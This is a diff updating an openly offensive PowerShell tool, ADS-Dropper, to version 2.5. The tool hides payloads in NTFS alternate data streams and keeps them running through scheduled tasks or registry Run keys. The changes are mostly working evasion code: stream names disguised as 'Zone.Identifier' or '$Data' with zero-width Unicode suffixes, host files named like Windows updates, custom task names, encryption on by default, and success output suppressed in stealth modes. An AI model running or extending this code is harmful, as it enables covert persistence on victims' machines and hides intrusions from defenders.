@@ -89,10 +89,11 @@
     How zero-width characters are applied to the stream name. Default: 'single'
       single  - One zero-width char
       multi   - 3-5 zero-width chars
-      hybrid  - Visible prefix + zero-width suffix (e.g., Zone.Identifier[ZW])
 
-.PARAMETER HybridPrefix
-    Visible prefix for hybrid ZeroWidthMode (e.g., 'Zone.Identifier', 'Summary').
+.PARAMETER StreamName
+    User-defined stream name. Used as-is when ZW is off; used as visible prefix
+    with ZW chars appended when ZW is on. Tier defaults: Advanced='Zone.Identifier',
+    Paranoid='$Data'. Overrides tier default when explicitly provided.
 
 .PARAMETER CreateDecoys
     Create N additional benign decoy ADS streams (Zone.Identifier, Summary, etc.)
@@ -165,7 +166,7 @@ Deploys Sliver beacon from file with registry Run key persistence.
 Description:
 Simple persistent beacon (writes to log every 5 minutes).
 No C2 connection, useful for testing persistence without network traffic.
-.NOTES File Name : ADS-Dropper.ps1 Author : Qweary (https://github.com/Qweary) Prerequisite : PowerShell 5.1+, NTFS filesystem, Windows 10+ Version : 2.4
+.NOTES File Name : ADS-Dropper.ps1 Author : Qweary (https://github.com/Qweary) Prerequisite : PowerShell 5.1+, NTFS filesystem, Windows 10+ Version : 2.5
 MITRE ATT&CK Mapping:
 - T1564.004: Hide Artifacts - NTFS File Attributes
 - T1053.005: Scheduled Task/Job
@@ -219,26 +220,46 @@ param(
     [string]$Obfuscate = 'Advanced',
 
     [switch]$ZeroWidthStreams,
-    
-    [ValidateSet('single', 'multi', 'hybrid')]
+
+    # 'single' = one ZW char suffix; 'multi' = multiple ZW chars suffix
+    # When -StreamName is set, ZW chars are appended to it as a suffix
+    [ValidateSet('single', 'multi')]
     [string]$ZeroWidthMode = 'single',
-    
-    [string]$HybridPrefix,
-    
+
+    # User-defined stream name. Used as-is when ZW is off; used as prefix when ZW is on.
+    # Tier defaults: Advanced='Zone.Identifier', Paranoid='$Data'
+    [string]$StreamName,
+
+    # User-defined host file name (e.g., 'WindowsUpdate.dat'). Directory is still auto-selected.
+    [string]$FileName,
+
+    # User-defined scheduled task name. Overrides the obfuscated name bank.
+    [string]$TaskName,
+
+    # Show artifact locations (ADS path, decoy paths) on deployment.
+    # Default: shown for -Obfuscate None only.
+    [switch]$ShowArtifacts,
+
     [ValidateRange(0, 10)]
     [int]$CreateDecoys = 0,
-    
+
     [string]$ManifestPath,
     [switch]$NoExec,
     [PSCredential]$Credential,
     [switch]$Help,
-    
+
     # Deep placement - bury ADS in legitimate Windows subdirectories
     [bool]$UseDeepPlacement = $false,
     # Attach to existing file instead of creating a new host file
     [bool]$AttachToExisting = $false,
-    
-    [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
+
+    [ValidateScript({
+        $valid = @('AtLogOn','AtStartup','OnIdle','OnUnlock','all')
+        foreach ($t in ($_ -split ',\s*')) {
+            if ($t -notin $valid) { throw "Invalid trigger: '$t'. Valid: $($valid -join ', ')" }
+        }
+        $true
+    })]
     [string[]]$Trigger = @('AtLogOn', 'AtStartup'),
 
     # Periodic execution interval in minutes (always added to tasks)
@@ -256,7 +277,7 @@ param(
 function Show-Help {
     $helpText = @"
 ===============================================================================
-  ADS-Dropper v2.4 — Quick Reference
+  ADS-Dropper v2.5 — Quick Reference
   "Execution without presence"
 ===============================================================================
 USAGE: .\ADS-Dropper.ps1 -Payload <cmd> [OPTIONS]
@@ -290,13 +311,16 @@ USAGE: .\ADS-Dropper.ps1 -Payload <cmd> [OPTIONS]
     Paranoid Advanced + zero-width Unicode stream/task names.         [Max stealth]
 
   Tier-implied settings (Advanced/Paranoid imply these automatically):
-    Randomize=true, UseDeepPlacement=true, AttachToExisting=true
-    Paranoid also implies: ZeroWidthStreams=true
+    Encrypt=true, Randomize=true, UseDeepPlacement=true, AttachToExisting=true
+    Paranoid also implies: ZeroWidthStreams=true, StreamName='$Data'
+    Advanced also implies: StreamName='Zone.Identifier'
+    Override any implied setting by passing the param explicitly.
 
 --- PERSISTENCE ---------------------------------------------------------------
 
   -Persist <method>         task | registry | none (default: task)
-  -Trigger <string[]>       AtLogOn, AtStartup, OnIdle, OnUnlock (default: AtLogOn+AtStartup)
+  -Trigger <string[]>       AtLogOn, AtStartup, OnIdle, OnUnlock, all (default: AtLogOn+AtStartup)
+                            Accepts: array @('AtLogOn','OnIdle') OR comma string 'AtLogOn,OnIdle'
   -PeriodicMinutes <int>    Periodic task interval in minutes (default: 5, range: 1-1440)
   -JitterPercent <int>      Timing jitter ±% of interval (default: 20, range: 0-50)
 
@@ -309,17 +333,23 @@ USAGE: .\ADS-Dropper.ps1 -Payload <cmd> [OPTIONS]
 --- EVASION ------------------------------------------------------------------
 
   -Encrypt                  DPAPI machine-bound encrypt (LocalMachine scope + MachineGUID)
+                            Default ON for Advanced/Paranoid. Use -Encrypt:$false to disable.
   -Randomize <bool>         Randomize artifact names (implied by Advanced/Paranoid)
   -UseDeepPlacement <bool>  Bury ADS in WER/Cache dirs (implied by Advanced/Paranoid)
   -AttachToExisting <bool>  Attach to existing system file (implied by Advanced/Paranoid)
   -NoExec                   Stage artifacts without executing (pre-staging / recon phase)
 
---- STREAM NAMING ------------------------------------------------------------
+--- STREAM & ARTIFACT NAMING -------------------------------------------------
 
   -ZeroWidthStreams          Enable ZW Unicode chars in stream names (implied by Paranoid)
-  -ZeroWidthMode <mode>     single | multi | hybrid (default: single)
-  -HybridPrefix <string>    Visible prefix for hybrid mode (e.g., 'Zone.Identifier')
+  -ZeroWidthMode <mode>     single | multi (default: single)
+                            When -StreamName is also set, ZW chars are appended as suffix.
+  -StreamName <string>      User-defined stream name. Used as-is (no ZW) or as prefix (ZW on).
+                            Tier defaults: Advanced='Zone.Identifier', Paranoid='$Data'
+  -FileName <string>        User-defined host file name (e.g., 'WindowsUpdate.dat')
+  -TaskName <string>        User-defined scheduled task name (overrides obfuscated name bank)
   -CreateDecoys <int>       Add N benign decoy ADS streams alongside payload (0-10)
+  -ShowArtifacts            Show ADS path and decoy locations on deployment (default: None only)
 
 --- REMOTE DEPLOYMENT --------------------------------------------------------
 
@@ -376,14 +406,25 @@ if ($Obfuscate -in @('Advanced', 'Paranoid')) {
     if (-not $PSBoundParameters.ContainsKey('UseDeepPlacement')) { $UseDeepPlacement = $true }
     if (-not $PSBoundParameters.ContainsKey('AttachToExisting')) { $AttachToExisting = $true }
     if (-not $PSBoundParameters.ContainsKey('Randomize')) { $Randomize = $true }
+    # Advanced/Paranoid: encryption on by default (BUG-011 fully resolved — _wrapEC hides DPAPI compound)
+    if (-not $PSBoundParameters.ContainsKey('Encrypt')) { $Encrypt = [switch]::new($true) }
 }
 if ($Obfuscate -eq 'Paranoid') {
     if (-not $PSBoundParameters.ContainsKey('ZeroWidthStreams')) { $ZeroWidthStreams = [switch]::new($true) }
+    # Paranoid default: '$Data' prefix + ZW suffix (system-looking; use single quotes in PS to avoid expansion)
+    if (-not $PSBoundParameters.ContainsKey('StreamName')) { $StreamName = '$Data' }
+}
+# Advanced default stream name: Zone.Identifier blends into legitimate Windows ADS traffic
+if ($Obfuscate -eq 'Advanced' -and -not $PSBoundParameters.ContainsKey('StreamName')) {
+    $StreamName = 'Zone.Identifier'
 }
 # Backward compat: -ZeroWidthStreams without explicit -Obfuscate upgrades to Paranoid
 if ($ZeroWidthStreams -and -not $PSBoundParameters.ContainsKey('Obfuscate')) {
     $Obfuscate = 'Paranoid'
 }
+# --- Trigger normalization (expand comma-separated strings + 'all' shorthand) ---
+$Trigger = @($Trigger | ForEach-Object { $_ -split ',\s*' } | ForEach-Object { $_.Trim() } | Select-Object -Unique)
+if ($Trigger -contains 'all') { $Trigger = @('AtLogOn','AtStartup','OnIdle','OnUnlock') }
 
 #region Zero-Width Unicode Functions
 
@@ -413,10 +454,8 @@ function Generate-ZeroWidthStream {
     [CmdletBinding()]
     [OutputType([string])]
     param(
-        [ValidateSet('single', 'multi', 'hybrid')]
+        [ValidateSet('single', 'multi')]
         [string]$Mode = 'single',
-
-        [string]$Prefix,
 
         [ValidateRange(2, 5)]
         [int]$Length = 3
@@ -428,25 +467,13 @@ function Generate-ZeroWidthStream {
                 $char = [char]($script:ZeroWidthChars | Get-Random)
                 return $char
             }
-            
+
             'multi' {
                 $chars = @()
                 for ($i = 0; $i -lt $Length; $i++) {
                     $chars += [char]($script:ZeroWidthChars | Get-Random)
                 }
                 return -join $chars
-            }
-            
-            'hybrid' {
-                # Legitimate stream names
-                $legitNames = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
-                
-                if ([string]::IsNullOrEmpty($Prefix)) {
-                    $Prefix = $legitNames | Get-Random
-                }
-                
-                $suffix = [char]($script:ZeroWidthChars | Get-Random)
-                return "$Prefix$suffix"
             }
         }
     } catch {
@@ -719,7 +746,8 @@ function Get-RandomADSConfig {
     param(
         [switch]$UseZeroWidth,
         [string]$ZwMode = 'single',
-        [string]$ZwPrefix,
+        [string]$StreamNameCustom,
+        [string]$FileNameCustom,
         [switch]$UseDeepPlacement,
         [switch]$AttachToExisting
     )
@@ -789,9 +817,13 @@ function Get-RandomADSConfig {
         if ($UseDeepPlacement -and -not $hostPath) {
             $targetDir = $validDirs | Get-Random
             if ($targetDir) {
-                $legitNames = @('Report.wer','etl_data.log','WPR_initiated.dat',
-                                'diag_report.xml','cache_entry.dat','aria-debug.log')
-                $fileName = if ($Randomize) { $legitNames | Get-Random } else { 'cache_entry.dat' }
+                if ($FileNameCustom) {
+                    $fileName = $FileNameCustom
+                } else {
+                    $legitNames = @('Report.wer','etl_data.log','WPR_initiated.dat',
+                                    'diag_report.xml','cache_entry.dat','aria-debug.log')
+                    $fileName = if ($Randomize) { $legitNames | Get-Random } else { 'cache_entry.dat' }
+                }
                 $hostPath = Join-Path $targetDir $fileName
             }
         }
@@ -799,31 +831,36 @@ function Get-RandomADSConfig {
 
     # Default / Linux fallback path
     if (-not $hostPath) {
+        $defaultFileName = if ($FileNameCustom) {
+            $FileNameCustom
+        } elseif ($Randomize) {
+            -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
+        } else {
+            'SystemCache.dat'
+        }
         if ($env:ProgramData) {
-            $hostPath = if ($Randomize) {
-                Join-Path $env:ProgramData (-join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }))
-            } else {
-                Join-Path $env:ProgramData "SystemCache.dat"
-            }
+            $hostPath = Join-Path $env:ProgramData $defaultFileName
         } else {
             # Running on Linux — construct Windows path manually
-            if ($Randomize) {
-                $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
-                $hostPath = "C:\ProgramData\$randomName"
-            } else {
-                $hostPath = "C:\ProgramData\SystemCache.dat"
-            }
+            $hostPath = "C:\ProgramData\$defaultFileName"
         }
     }
    
-    $streamName = if ($UseZeroWidth) {
-        Generate-ZeroWidthStream -Mode $ZwMode -Prefix $ZwPrefix
-    } else {
-        if ($Randomize) {
-            -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
+    $streamName = if (-not [string]::IsNullOrEmpty($StreamNameCustom)) {
+        # User-provided name: append ZW suffix if ZW active, use as-is if not
+        if ($UseZeroWidth) {
+            $zwSuffix = Generate-ZeroWidthStream -Mode $ZwMode -Length 3
+            "$StreamNameCustom$zwSuffix"
         } else {
-            'payload'
+            $StreamNameCustom
         }
+    } elseif ($UseZeroWidth) {
+        # Pure ZW: no visible prefix
+        Generate-ZeroWidthStream -Mode $ZwMode -Length 3
+    } elseif ($Randomize) {
+        -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
+    } else {
+        'payload'
     }
 
     return @{
@@ -1418,7 +1455,8 @@ if (-not $Payload) {
 # Generate config
 $config = Get-RandomADSConfig -UseZeroWidth:$ZeroWidthStreams `
                               -ZwMode $ZeroWidthMode `
-                              -ZwPrefix $HybridPrefix `
+                              -StreamNameCustom $StreamName `
+                              -FileNameCustom $FileName `
                               -UseDeepPlacement:$UseDeepPlacement `
                               -AttachToExisting:$AttachToExisting
 
@@ -1429,7 +1467,7 @@ if ($ZeroWidthStreams) {
 }
 
 # Generate obfuscated names (consistent across all references in this deployment)
-$taskName = Get-ObfuscatedName -Type TaskName -Level $Obfuscate
+$taskName = if ($TaskName) { $TaskName } else { Get-ObfuscatedName -Type TaskName -Level $Obfuscate }
 $taskSuffix = Get-ObfuscatedName -Type TaskSuffix -Level $Obfuscate
 $ghkFuncName = Get-ObfuscatedName -Type FunctionGHK -Level $Obfuscate
 $decFuncName = Get-ObfuscatedName -Type FunctionDec -Level $Obfuscate
@@ -1457,7 +1495,6 @@ if ($GenerateOnly) {
         PersistenceMethod = $Persist
         DecoysCount = $CreateDecoys
         ZeroWidthMode = $ZeroWidthMode
-        HybridPrefix = $HybridPrefix
         Randomized = [bool]$Randomize
         DeepPlacement = [bool]$UseDeepPlacement
         AttachToExisting = [bool]$AttachToExisting
@@ -1472,6 +1509,11 @@ if ($GenerateOnly) {
 # Create decoys
 if ($CreateDecoys -gt 0) {
     Create-DecoyStreams -HostPath $config.HostPath -Count $CreateDecoys
+    if ($ShowArtifacts -or $Obfuscate -eq 'None') {
+        Write-Host "[+] Decoys created at $($config.HostPath):" -ForegroundColor DarkGray
+        @(':Zone.Identifier',':Summary',':Comments',':Author')[0..($CreateDecoys-1)] |
+            ForEach-Object { Write-Host "    $($config.HostPath)$_" -ForegroundColor DarkGray }
+    }
 }
 
 # Write payload
@@ -1587,6 +1629,8 @@ if (-not $NoExec) {
     }
 }
 
-Write-Host "[+] Deployment complete" -ForegroundColor Green
+if ($ShowArtifacts -or $Obfuscate -eq 'None') {
+    Write-Host "[+] Deployment complete" -ForegroundColor Green
+}
 
 #endregion
